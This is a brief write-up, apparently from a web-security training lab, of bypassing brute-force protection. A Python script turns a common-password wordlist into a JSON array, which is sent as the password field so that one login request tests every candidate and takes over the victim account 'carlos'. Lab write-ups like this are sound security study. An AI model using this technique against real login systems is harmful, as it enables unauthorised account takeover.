## Description:
<p> 
This lab is vulnerable due to a logic flaw in its brute-force protection. To solve the lab, brute-force Carlos's password, then access his "My account" page.
</p>

<p> Victim's username: carlos </p> 
<p> with password worldlist for bruteforce  you can get it from here </p> https://portswigger.net/web-security/authentication/auth-lab-passwords
now lets open burpsuite and see  request 

![Screenshot from 2020-08-13 01-13-16](https://user-images.githubusercontent.com/36403473/90077666-05319f80-dd03-11ea-8cb3-4248209cfc5a.png)

<p> the data is  sent in <b> json<b> format </p>
so i convert password wordlist in json format by simple python code 

```python
import json
with open('pass.txt') as file:
    arr=[]
    for i in file:
        arr.append(i.rstrip())
print(json.dumps(arr))
file.close() 
```
after conversion  
```
["123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000", "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars", "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper", "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea", "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin", "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor", "monitoring", "montana", "moon", "moscow"]
```
modifying password field in the request 

![Screenshot from 2020-08-13 00-57-19](https://user-images.githubusercontent.com/36403473/90078237-80e01c00-dd04-11ea-88e1-4aeba86b6c38.png)
from burpsuite i select ->Show response in browser
now i have authentication to have carlos previllige.

This lab is easy, but the main idea is how to do the bruteforce process in only one request.
